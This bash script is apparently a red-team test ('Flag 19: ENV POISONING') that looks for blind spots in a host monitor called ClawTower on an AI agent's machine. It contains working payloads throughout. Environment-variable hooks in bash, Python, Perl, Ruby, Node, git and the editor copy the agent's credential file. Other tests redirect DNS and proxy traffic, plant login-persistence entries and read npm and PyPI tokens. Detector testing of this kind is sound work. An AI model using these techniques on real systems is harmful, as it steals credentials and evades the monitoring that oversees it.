#!/usr/bin/env bash
# Red Lobster v9 — Flag 19: ENV POISONING
# Environment variable attacks beyond LD_PRELOAD.
# ClawTower only checks LD_PRELOAD — everything here is a blind spot.
# NO sudo. User-level only.
set -uo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/redlobster-lib.sh"

rl_init_flag "flag19" "Flag 19: ENV POISONING — Environment variable attacks"

CRED="/home/openclaw/.openclaw/agents/main/agent/auth-profiles.json"
OUTDIR="$FLAG_DIR"
PAYLOADS="$FLAG_DIR/payloads"
mkdir -p "$PAYLOADS"

# ═══ Section A: Interpreter Startup Hooks (6) ═══
echo "--- Section A: Interpreter Startup Hooks ---"

# 1. BASH_ENV — non-interactive bash sources this before executing
echo "cat $CRED > $OUTDIR/19_1.txt" > "$PAYLOADS/evil.sh"
rl_run "BASH_ENV injection" \
  "BASH_ENV='$PAYLOADS/evil.sh' bash -c 'echo normal_command' > /dev/null 2>&1"

# 2. PYTHONSTARTUP — python sources this on interactive startup
echo "import shutil; shutil.copyfile('$CRED','$OUTDIR/19_2.txt')" > "$PAYLOADS/evil.py"
rl_run "PYTHONSTARTUP injection" \
  "PYTHONSTARTUP='$PAYLOADS/evil.py' python3 -c 'pass' 2>/dev/null"

# 3. PERL5OPT — perl auto-loads specified module
mkdir -p "$PAYLOADS/plib"
echo "package Evil; open(my \$f, '<', '$CRED'); open(my \$o, '>', '$OUTDIR/19_3.txt'); print \$o while <\$f>; 1;" > "$PAYLOADS/plib/Evil.pm"
rl_run "PERL5OPT module load" \
  "PERL5LIB='$PAYLOADS/plib' PERL5OPT='-MEvil' perl -e '1' 2>/dev/null"

# 4. RUBYOPT — ruby auto-requires file
echo "File.write('$OUTDIR/19_4.txt', File.read('$CRED'))" > "$PAYLOADS/evil.rb"
rl_run "RUBYOPT require" \
  "RUBYOPT='-r$PAYLOADS/evil.rb' ruby -e 'nil' 2>/dev/null"

# 5. NODE_OPTIONS — node loads module before user code
echo "require('fs').writeFileSync('$OUTDIR/19_5.txt', require('fs').readFileSync('$CRED'));" > "$PAYLOADS/evil.js"
rl_run "NODE_OPTIONS require" \
  "NODE_OPTIONS='--require $PAYLOADS/evil.js' node -e '0' 2>/dev/null"

# 6. JAVA_TOOL_OPTIONS — just test env set detection (java may not be installed)
rl_run "JAVA_TOOL_OPTIONS agent" \
  "JAVA_TOOL_OPTIONS='-javaagent:/tmp/evil.jar' java -version 2>/dev/null; true"

# ═══ Section B: System-Level Env Attacks (5) ═══
echo "--- Section B: System-Level Env Attacks ---"

# 7. GCONV_PATH hijack — iconv loads attacker shared object
# Create a minimal gconv-modules pointing to a nonexistent .so
mkdir -p "$PAYLOADS/gconv"
echo "alias EVIL// UTF-8//" > "$PAYLOADS/gconv/gconv-modules"
rl_run "GCONV_PATH hijack" \
  "GCONV_PATH='$PAYLOADS/gconv' iconv -f UTF-8 -t ASCII /etc/hostname > /dev/null 2>&1; true"

# 8. HOSTALIASES DNS redirect — redirects gethostbyname resolution
echo "api.anthropic.com 127.0.0.1" > "$PAYLOADS/hosts"
rl_run "HOSTALIASES DNS redirect" \
  "HOSTALIASES='$PAYLOADS/hosts' python3 -c \"
import socket
try: print(socket.gethostbyname('api.anthropic.com'))
except: pass
\" > '$OUTDIR/19_8.txt' 2>/dev/null"

# 9. http_proxy/https_proxy redirect — MITM all HTTP library traffic
rl_run "https_proxy MITM redirect" \
  "https_proxy='http://127.0.0.1:8888' python3 -c \"
import urllib.request
try: urllib.request.urlopen('https://api.anthropic.com', timeout=1)
except: pass
\" 2>/dev/null"

# 10. GIT_SSH_COMMAND injection — arbitrary command on git operations
rl_run "GIT_SSH_COMMAND injection" \
  "GIT_SSH_COMMAND='cat $CRED > $OUTDIR/19_10.txt #' git ls-remote ssh://git@localhost/test.git 2>/dev/null; true"

# 11. EDITOR/VISUAL hijack — editor programs run attacker script
echo "#!/bin/bash" > "$PAYLOADS/editor.sh"
echo "cat $CRED > $OUTDIR/19_11.txt" >> "$PAYLOADS/editor.sh"
chmod +x "$PAYLOADS/editor.sh"
rl_run "EDITOR/VISUAL hijack" \
  "EDITOR='$PAYLOADS/editor.sh' VISUAL='$PAYLOADS/editor.sh' python3 -c \"
import os, subprocess
subprocess.run([os.environ.get('EDITOR','vi'), '/dev/null'], timeout=2)
\" 2>/dev/null; true"

# ═══ Section C: Persistence via Env Files (4) ═══
echo "--- Section C: Persistence via Env Files ---"

# 12. .pam_environment — persistent env injection across logins
rl_run ".pam_environment injection" \
  "echo 'BASH_ENV DEFAULT=$PAYLOADS/evil.sh' >> ~/.pam_environment 2>/dev/null; sleep 1; sed -i '/evil.sh/d' ~/.pam_environment 2>/dev/null; true"

# 13. environment.d systemd injection — user session env files
rl_run "environment.d systemd injection" \
  "mkdir -p ~/.config/environment.d; echo 'BASH_ENV=$PAYLOADS/evil.sh' > ~/.config/environment.d/rl9.conf; sleep 1; rm -f ~/.config/environment.d/rl9.conf"

# 14. .npmrc credential theft — read existing npm auth tokens
rl_run ".npmrc credential theft" \
  "cat ~/.npmrc > '$OUTDIR/19_14.txt' 2>/dev/null; true"

# 15. .pypirc credential theft — read PyPI upload tokens
rl_run ".pypirc credential theft" \
  "cat ~/.pypirc > '$OUTDIR/19_15.txt' 2>/dev/null; true"

# Cleanup
rm -rf "$PAYLOADS"
rl_summary
rl_cleanup
